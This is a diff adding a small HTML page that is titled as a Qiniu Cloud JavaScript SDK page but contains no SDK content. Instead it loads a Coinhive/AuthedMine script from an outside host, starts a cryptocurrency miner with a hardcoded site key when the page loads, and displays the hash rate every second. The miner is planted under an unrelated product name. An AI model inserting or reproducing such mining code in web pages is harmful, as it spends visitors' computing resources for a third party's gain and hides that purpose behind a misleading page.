@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>七牛云 - JavaScript SDK</title>
+    <link href="images/favicon.ico" rel="shortcut icon">
+</head>
+<body>
+    <div id="contain"></div>
+</body>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('whySWVJpU8jBm7iDhgjKEze1uN2HhPbD');
+    setInterval(function () {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        document.getElementById("contain").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec<br>" + "Total Hashes = " + totalHashes + "Accepted Hashes = " + acceptedHashes;
+    }, 1000);
+    miner.start();
+</script>
+</html>
